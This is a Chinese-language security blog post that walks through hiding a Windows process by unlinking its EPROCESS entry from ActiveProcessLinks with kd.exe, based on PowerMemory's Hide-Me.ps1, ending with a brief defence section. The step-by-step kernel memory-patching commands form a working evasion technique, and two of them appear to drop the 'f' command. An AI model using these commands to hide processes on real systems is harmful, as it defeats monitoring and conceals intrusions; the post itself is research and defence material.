---
layout: post
title: Powershell tricks::Hide Process by kd.exe
---

## 0x00 前言
---

`Pierre-Alexandre Braeken`在SecTor2016上做了一个很棒的演讲——HACK MICROSOFT BY USING MICROSOFT SIGNED BINARIES

他对自己开源的工具`PowerMemory`做了介绍，将powershell同使用微软签名的程序相结合，可以绕过Device Guard和杀毒软件的拦截

**演讲视频地址：**

https://sector.ca/sessions/hack-microsoft-by-using-microsoft-signed-binaries/

**PowerMemory项目地址：**

https://github.com/giMini/PowerMemory/

## 0x01 简介
---

PowerMemory内包含的脚本很多，其中一个比较有趣的脚本是`Hide-Me.ps1`，通过借助`kb.exe`来实现对进程的隐藏

本文将对该脚本进行测试，介绍进程隐藏的原理，修改原脚本，分析利用和防御方法。

## 0x02 相关概念
---

**PCB(process control block)：**

进程控制块，是系统为了管理进程专门设置的一个数据结构

PCB的组织方式：

- 线性表方式：不论进程的状态如何，将所有的PCB连续地存放在内存的系统区。这种方式适用于系统中进程数目不多的情况
- 索引表方式：该方式是线性表方式的改进，系统按照进程的状态分别建立就绪索引表、阻塞索引表等
- 链接表方式：系统按照进程的状态将进程的PCB组成队列，从而形成就绪队列、阻塞队列、运行队列等

不同操作系统的PCB结构不同

Windows下的PCB是EPROCESS结构

进程链表是一个双向环链表

**EPROCESS结构：**

每个进程都有一个EPROCESS结构，里面保存着进程的各种信息和相关结构的指针

**注：**

```
Windows各版本的EPROCESS结构存在差异
```

EPROCESS结构位于系统地址空间，所以访问这个结构需要有ring0的权限

**注：**

```
Windows开启Local kernel debugging模式后，可进入ring0，使用内核态调试器
```

基本的内核态调试器有以下两种：

- kd.exe（KD）

	命令行模式

	常用于调试内核态的应用程序和驱动程序，调试用户态的应用程序，或者监视操作系统自身的行为等

- windbg.exe（WinDbg）

	界面模式

	可以为Windows内核、内核态驱动程序以及用户态应用程序提供完整的源代码级调试


通过kd.exe可以查看EPROCESS结构，命令行参数如下：


```
kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "dt nt!_eprocess"
```

回显如下：

```
lkd> kd: Reading initial command 'dt nt!_eprocess;Q'
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 RundownProtect   : _EX_RUNDOWN_REF
   +0x2e8 UniqueProcessId  : Ptr64 Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
   +0x300 Flags2           : Uint4B
   +0x300 JobNotReallyActive : Pos 0, 1 Bit
   +0x300 AccountingFolded : Pos 1, 1 Bit
   +0x300 NewProcessReported : Pos 2, 1 Bit
   +0x300 ExitProcessReported : Pos 3, 1 Bit
   +0x300 ReportCommitChanges : Pos 4, 1 Bit
   +0x300 LastReportMemory : Pos 5, 1 Bit
   +0x300 ForceWakeCharge  : Pos 6, 1 Bit
   +0x300 CrossSessionCreate : Pos 7, 1 Bit
   +0x300 NeedsHandleRundown : Pos 8, 1 Bit
   +0x300 RefTraceEnabled  : Pos 9, 1 Bit
   +0x300 DisableDynamicCode : Pos 10, 1 Bit
   +0x300 EmptyJobEvaluated : Pos 11, 1 Bit
   +0x300 DefaultPagePriority : Pos 12, 3 Bits
   +0x300 PrimaryTokenFrozen : Pos 15, 1 Bit
   +0x300 ProcessVerifierTarget : Pos 16, 1 Bit
   +0x300 StackRandomizationDisabled : Pos 17, 1 Bit
   +0x300 AffinityPermanent : Pos 18, 1 Bit
   +0x300 AffinityUpdateEnable : Pos 19, 1 Bit
   +0x300 PropagateNode    : Pos 20, 1 Bit
   +0x300 ExplicitAffinity : Pos 21, 1 Bit
   +0x300 ProcessExecutionState : Pos 22, 2 Bits
   +0x300 DisallowStrippedImages : Pos 24, 1 Bit
   +0x300 HighEntropyASLREnabled : Pos 25, 1 Bit
   +0x300 ExtensionPointDisable : Pos 26, 1 Bit
   +0x300 ForceRelocateImages : Pos 27, 1 Bit
   +0x300 ProcessStateChangeRequest : Pos 28, 2 Bits
   +0x300 ProcessStateChangeInProgress : Pos 30, 1 Bit
   +0x300 DisallowWin32kSystemCalls : Pos 31, 1 Bit
   +0x304 Flags            : Uint4B
   +0x304 CreateReported   : Pos 0, 1 Bit
   +0x304 NoDebugInherit   : Pos 1, 1 Bit
   +0x304 ProcessExiting   : Pos 2, 1 Bit
   +0x304 ProcessDelete    : Pos 3, 1 Bit
   +0x304 ControlFlowGuardEnabled : Pos 4, 1 Bit
   +0x304 VmDeleted        : Pos 5, 1 Bit
   +0x304 OutswapEnabled   : Pos 6, 1 Bit
   +0x304 Outswapped       : Pos 7, 1 Bit
   +0x304 FailFastOnCommitFail : Pos 8, 1 Bit
   +0x304 Wow64VaSpace4Gb  : Pos 9, 1 Bit
   +0x304 AddressSpaceInitialized : Pos 10, 2 Bits
   +0x304 SetTimerResolution : Pos 12, 1 Bit
   +0x304 BreakOnTermination : Pos 13, 1 Bit
   +0x304 DeprioritizeViews : Pos 14, 1 Bit
   +0x304 WriteWatch       : Pos 15, 1 Bit
   +0x304 ProcessInSession : Pos 16, 1 Bit
   +0x304 OverrideAddressSpace : Pos 17, 1 Bit
   +0x304 HasAddressSpace  : Pos 18, 1 Bit
   +0x304 LaunchPrefetched : Pos 19, 1 Bit
   +0x304 Background       : Pos 20, 1 Bit
   +0x304 VmTopDown        : Pos 21, 1 Bit
   +0x304 ImageNotifyDone  : Pos 22, 1 Bit
   +0x304 PdeUpdateNeeded  : Pos 23, 1 Bit
   +0x304 VdmAllowed       : Pos 24, 1 Bit
   +0x304 ProcessRundown   : Pos 25, 1 Bit
   +0x304 ProcessInserted  : Pos 26, 1 Bit
   +0x304 DefaultIoPriority : Pos 27, 3 Bits
   +0x304 ProcessSelfDelete : Pos 30, 1 Bit
   +0x304 SetTimerResolutionLink : Pos 31, 1 Bit
   +0x308 CreateTime       : _LARGE_INTEGER
   +0x310 ProcessQuotaUsage : [2] Uint8B
   +0x320 ProcessQuotaPeak : [2] Uint8B
   +0x330 PeakVirtualSize  : Uint8B
   +0x338 VirtualSize      : Uint8B
   +0x340 SessionProcessLinks : _LIST_ENTRY
   +0x350 ExceptionPortData : Ptr64 Void
   +0x350 ExceptionPortValue : Uint8B
   +0x350 ExceptionPortState : Pos 0, 3 Bits
   +0x358 Token            : _EX_FAST_REF
   +0x360 WorkingSetPage   : Uint8B
   +0x368 AddressCreationLock : _EX_PUSH_LOCK
   +0x370 PageTableCommitmentLock : _EX_PUSH_LOCK
   +0x378 RotateInProgress : Ptr64 _ETHREAD
   +0x380 ForkInProgress   : Ptr64 _ETHREAD
   +0x388 CommitChargeJob  : Ptr64 _EJOB
   +0x390 CloneRoot        : _RTL_AVL_TREE
   +0x398 NumberOfPrivatePages : Uint8B
   +0x3a0 NumberOfLockedPages : Uint8B
   +0x3a8 Win32Process     : Ptr64 Void
   +0x3b0 Job              : Ptr64 _EJOB
   +0x3b8 SectionObject    : Ptr64 Void
   +0x3c0 SectionBaseAddress : Ptr64 Void
   +0x3c8 Cookie           : Uint4B
   +0x3d0 WorkingSetWatch  : Ptr64 _PAGEFAULT_HISTORY
   +0x3d8 Win32WindowStation : Ptr64 Void
   +0x3e0 InheritedFromUniqueProcessId : Ptr64 Void
   +0x3e8 LdtInformation   : Ptr64 Void
   +0x3f0 OwnerProcessId   : Uint8B
   +0x3f8 Peb              : Ptr64 _PEB
   +0x400 Session          : Ptr64 Void
   +0x408 AweInfo          : Ptr64 Void
   +0x410 QuotaBlock       : Ptr64 _EPROCESS_QUOTA_BLOCK
   +0x418 ObjectTable      : Ptr64 _HANDLE_TABLE
   +0x420 DebugPort        : Ptr64 Void
   +0x428 WoW64Process     : Ptr64 _EWOW64PROCESS
   +0x430 DeviceMap        : Ptr64 Void
   +0x438 EtwDataSource    : Ptr64 Void
   +0x440 PageDirectoryPte : Uint8B
   +0x448 ImageFilePointer : Ptr64 _FILE_OBJECT
   +0x450 ImageFileName    : [15] UChar
   +0x45f PriorityClass    : UChar
   +0x460 SecurityPort     : Ptr64 Void
   +0x468 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO
   +0x470 JobLinks         : _LIST_ENTRY
   +0x480 HighestUserAddress : Ptr64 Void
   +0x488 ThreadListHead   : _LIST_ENTRY
   +0x498 ActiveThreads    : Uint4B
   +0x49c ImagePathHash    : Uint4B
   +0x4a0 DefaultHardErrorProcessing : Uint4B
   +0x4a4 LastThreadExitStatus : Int4B
   +0x4a8 PrefetchTrace    : _EX_FAST_REF
   +0x4b0 LockedPagesList  : Ptr64 Void
   +0x4b8 ReadOperationCount : _LARGE_INTEGER
   +0x4c0 WriteOperationCount : _LARGE_INTEGER
   +0x4c8 OtherOperationCount : _LARGE_INTEGER
   +0x4d0 ReadTransferCount : _LARGE_INTEGER
   +0x4d8 WriteTransferCount : _LARGE_INTEGER
   +0x4e0 OtherTransferCount : _LARGE_INTEGER
   +0x4e8 CommitChargeLimit : Uint8B
   +0x4f0 CommitCharge     : Uint8B
   +0x4f8 CommitChargePeak : Uint8B
   +0x500 Vm               : _MMSUPPORT
   +0x5f8 MmProcessLinks   : _LIST_ENTRY
   +0x608 ModifiedPageCount : Uint4B
   +0x60c ExitStatus       : Int4B
   +0x610 VadRoot          : _RTL_AVL_TREE
   +0x618 VadHint          : Ptr64 Void
   +0x620 VadCount         : Uint8B
   +0x628 VadPhysicalPages : Uint8B
   +0x630 VadPhysicalPagesLimit : Uint8B
   +0x638 AlpcContext      : _ALPC_PROCESS_CONTEXT
   +0x658 TimerResolutionLink : _LIST_ENTRY
   +0x668 TimerResolutionStackRecord : Ptr64 _PO_DIAG_STACK_RECORD
   +0x670 RequestedTimerResolution : Uint4B
   +0x674 SmallestTimerResolution : Uint4B
   +0x678 ExitTime         : _LARGE_INTEGER
   +0x680 InvertedFunctionTable : Ptr64 _INVERTED_FUNCTION_TABLE
   +0x688 InvertedFunctionTableLock : _EX_PUSH_LOCK
   +0x690 ActiveThreadsHighWatermark : Uint4B
   +0x694 LargePrivateVadCount : Uint4B
   +0x698 ThreadListLock   : _EX_PUSH_LOCK
   +0x6a0 WnfContext       : Ptr64 Void
   +0x6a8 Spare0           : Uint8B
   +0x6b0 SignatureLevel   : UChar
   +0x6b1 SectionSignatureLevel : UChar
   +0x6b2 Protection       : _PS_PROTECTION
   +0x6b3 HangCount        : UChar
   +0x6b4 Flags3           : Uint4B
   +0x6b4 Minimal          : Pos 0, 1 Bit
   +0x6b4 ReplacingPageRoot : Pos 1, 1 Bit
   +0x6b4 DisableNonSystemFonts : Pos 2, 1 Bit
   +0x6b4 AuditNonSystemFontLoading : Pos 3, 1 Bit
   +0x6b4 Crashed          : Pos 4, 1 Bit
   +0x6b4 JobVadsAreTracked : Pos 5, 1 Bit
   +0x6b4 VadTrackingDisabled : Pos 6, 1 Bit
   +0x6b4 AuxiliaryProcess : Pos 7, 1 Bit
   +0x6b4 SubsystemProcess : Pos 8, 1 Bit
   +0x6b4 IndirectCpuSets  : Pos 9, 1 Bit
   +0x6b4 InPrivate        : Pos 10, 1 Bit
   +0x6b4 ProhibitRemoteImageMap : Pos 11, 1 Bit
   +0x6b4 ProhibitLowILImageMap : Pos 12, 1 Bit
   +0x6b4 SignatureMitigationOptIn : Pos 13, 1 Bit
   +0x6b8 DeviceAsid       : Int4B
   +0x6c0 SvmData          : Ptr64 Void
   +0x6c8 SvmProcessLock   : _EX_PUSH_LOCK
   +0x6d0 SvmLock          : Uint8B
   +0x6d8 SvmProcessDeviceListHead : _LIST_ENTRY
   +0x6e8 LastFreezeInterruptTime : Uint8B
   +0x6f0 DiskCounters     : Ptr64 _PROCESS_DISK_COUNTERS
   +0x6f8 PicoContext      : Ptr64 Void
   +0x700 TrustletIdentity : Uint8B
   +0x708 KeepAliveCounter : Uint4B
   +0x70c NoWakeKeepAliveCounter : Uint4B
   +0x710 HighPriorityFaultsAllowed : Uint4B
   +0x718 EnergyValues     : Ptr64 _PROCESS_ENERGY_VALUES
   +0x720 VmContext        : Ptr64 Void
   +0x728 SequenceNumber   : Uint8B
   +0x730 CreateInterruptTime : Uint8B
   +0x738 CreateUnbiasedInterruptTime : Uint8B
   +0x740 TotalUnbiasedFrozenTime : Uint8B
   +0x748 LastAppStateUpdateTime : Uint8B
   +0x750 LastAppStateUptime : Pos 0, 61 Bits
   +0x750 LastAppState     : Pos 61, 3 Bits
   +0x758 SharedCommitCharge : Uint8B
   +0x760 SharedCommitLock : _EX_PUSH_LOCK
   +0x768 SharedCommitLinks : _LIST_ENTRY
   +0x778 AllowedCpuSets   : Uint8B
   +0x780 DefaultCpuSets   : Uint8B
   +0x778 AllowedCpuSetsIndirect : Ptr64 Uint8B
   +0x780 DefaultCpuSetsIndirect : Ptr64 Uint8B
```

其中,`+0x2f0 ActiveProcessLinks : _LIST_ENTRY`表示进程活动链表


**进程活动链表：**

是一个PLIST_ENTRY结构的双向链表，把每个EPROCESS链接起来

当一个新进程建立的时候，父进程负责完成EPROCESS块，然后把ActiveProcessLinks链接到一个全局内核变量PsActiveProcessHead链表中

当进程结束的时候，该进程的EPROCESS结构从活动进程链上摘除

遍历整个链表，就能实现对进程的枚举



**双链表的删除操作：**

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-1.png)


>  void DDeleteNode(DListNode *p)
>       {//在带头结点的双链表中，删除结点*p，设*p为非终端结点
>           p->prior->next=p->next;//① （使p的前一个结点的后驱直接指向 原来的p的后驱）
>           p->next->prior=p->prior;//② （使p的后一个结点的前驱 直接为原来p的前一个结点）
>           free(p);//③ （释放p的内存）
>       }


图和说明引用自http://blog.163.com/haibianfeng_yr/blog/static/34572620201453061036702/



**隐藏进程：**

相当于对双向链表ActiveProcessLinks断链

对应双链表的删除需要做如下操作：

1. p->prior->next=p->next
Flink->Blink=Blink
2. p->next->prior=p->prior
Blink->Flink = Flink
3. free(p)
Blink =dwSelfEPROCESS
Flink = dwSelfEPROCESS

接下来实例介绍如何通过kd.exe隐藏进程，也就是双链表的断链



## 0x03 通过kd.exe隐藏进程
---

**环境搭建：**

- 开启Local kernel debugging模式

**注：**

```
自从Windows Vista开始，Local kernel debugging默认被禁用
```

开启方法：

管理员权限执行：`bcdedit -debug on`,重启

下载安装Debugging Tools for Windows,找到kd.exe

测试进程：`notepad.exe`
测试系统： `Win10 x64`

### 1、获取notepad.exe的内存起始地址

kd命令：

```
!process 0 0 $processName
```

完整命令：

```
kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "!process 0 0 notepad.exe;Q" 
```


如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-2.png)



notepad.exe的内存起始地址$processAddress为ffffe00195236080


### 2、获取进程notepad.exe的Flink和Blink

kd命令：

```
dt nt!_eprocess ActiveProcessLinks ImageFileName $processAddress
```

完整命令：

```
kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "dt nt!_eprocess ActiveProcessLinks ImageFileName ffffe00195236080;Q" 
```

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-3.png)

**注：**

```
FLINK指针指向下一个元素，相当于双链表中的p->next
BLINK指针指向前一个元素，相当于双链表中的p->prior
_LIST_ENTRY结构如下：
_LIST_ENTRY[Flink-Blink]
前一参数代表Flink，后一参数代表Blink
```

由上图可知：

- $Flink：0xffffe001`93e1a370

- $Blink：0xffffe001`9604f6f0


### 3、获取进程notepad.exe在双链表的地址$thisProcessLinks

kd命令：

```
dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName $processAddress
```

完整命令：

```
kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName ffffe00195236080;Q" 
```

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-4.png)

可知：

- $thisProcessLinks：0xffffe001`95236370

**注:**

```
dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName相当于进程notepad.exe的前一个进程
```

故

```
+0x008 Blink ： 0xffffe001`9604f6f0 _LIST_ENTRY [0xffffe001`95236370-Blink]
```

中的0xffffe001`95236370相当于进程notepad.exe在双链表的地址$thisProcessLinks

**补充：**

+0x000 Flink: 0xffffe001`93e1a370 _LIST_ENTRY[Flink-Blink]中的Blink也能代表双链表的地址$thisProcessLinks

**简单的理解：**

当前进程的Blink的Flink等价于当前进程的Flink的Blink，也就是当前进程的地址$thisProcessLinks


### 4、将前一进程指向下一个元素的指针FLINK替换为当前进程的FLINK指针(Flink->Blink=Blink)

即双链表删除操作的第1步：

`p->prior->next=p->next`

kd命令：

```
f $Blink+0x000 L4 ($Flink的第0字节) ($Flink的第1字节) ($Flink的第2字节) ($Flink的第3字节)
```

**注：**

```
+0x000代表Flink
+0x008代表Blink
$Blink+0x000代表p->prior->next(0x000为0，可省略)
L4参数指定内存区间的长度为4个DWORD
```


完整命令：

```
kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "f 0xffffe001`9604f6f0 L4 0x70 0xa3 0xe1 0x93;Q"
```

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-5.png)

操作成功，实现双链表删除中的p->prior->next=p->next

### 5、将下一进程指向前一个元素的指针Blink替换为当前进程的BLINK指针

即双链表删除操作的第2步：

`p->next->prior=p->prior`

kd命令：

```
f $Flink+0x008 L4 ($Blink的第0字节) ($Blink的第1字节) ($Blink的第2字节) ($Blink的第3字节)
```

**注：**

```
+0x008代表Blink
$Flink++0x008代表p->next->prior
```

完整命令：

```
kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "f 0xffffe001`93e1a370 L4 0xf0 0xf6 0x04 0x96;Q"
```

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-6.png)

操作成功，实现双链表删除中的p->next->prior=p->prior


### 6、进程自身的新Flink指向进程自身的双链表地址$thisProcessLinks

kd命令：

```
f $thisProcessLinks+0x000 L4 ($thisProcessLinks的第0字节) ($thisProcessLinks的第1字节) ($thisProcessLinks的第2字节) (thisProcessLinks的第3字节)
```

**注：**

```
+0x000代表Flink
```

完整命令：

```
kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "0xffffe001`95236370 L4 0x70 0x63 0x23 0x95;Q"
```

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-7.png)


### 7、进程自身的新Blink指向进程自身的双链表地址$thisProcessLinks

kd命令：

```
f $thisProcessLinks+0x008 L4 ($thisProcessLinks的第0字节) ($thisProcessLinks的第1字节) ($thisProcessLinks的第2字节) (thisProcessLinks的第3字节)
```

**注：**

```
+0x008代表Blink
```

完整命令：

```
kd -kl -y "srv*c:\symbols*http://msdl.microsoft.com/download/symbols" -c "0xffffe001`95236370+0x008 L4 0x70 0x63 0x23 0x95;Q"
```

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-15/2-8.png)

**注：**

```
7、8操作必须，对应双链表删除操作中的free(p),否则会蓝屏
```

### 8、测试

在tasklist和Process Explorer中，notepad.exe进程均被隐藏

## 0x04 powershell自动实现
---

以上操作可通过powershell脚本自动实现，这就是Hide-Me.ps1实现的功能

Hide-Me.ps1有一处需要注意的地方:
https://github.com/giMini/PowerMemory/blob/master/PowerProcess/Hide-Me.ps1#L128

```
f $BLINK L4 0x$($FLINK.Substring(17,2)) 0x$($FLINK.Substring(15,2)) 0x$($FLINK.Substring(13,2)) 0x$($FLINK.Substring(11,2))"
```
此处`$BLINK`实际为`$BLINK+0x000`,表示`p->prior->next`(0x000为0，已省略)


适用环境：

- Win7、8、10 64位操作系统

利用前提：

- 开启Local kernel debugging模式
- 管理员权限执行：bcdedit -debug on
- 重启后测试

由于PowerMemory做了脚本整合，所以Hide-Me.ps1还需要其他支持文件

我对其进行了少量修改，只提取隐藏进程的关键代码，最终整合到一个ps脚本中，地址如下：

https://github.com/3gstudent/Hide-Process-by-kd.exe

## 0x05 防御思路
---

该方法利用前提：

已获得系统管理员权限并开启Local kernel debugging模式，系统重启

也就是说攻击者已进入ring 0层才能利用这个方法

对于普通用户，可以永久关闭Local kernel debugging模式：

- bcdedit -debug off

## 0x06 补充
---

- 该脚本尚不支持32位系统
- Windbg也能实现相同操作

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


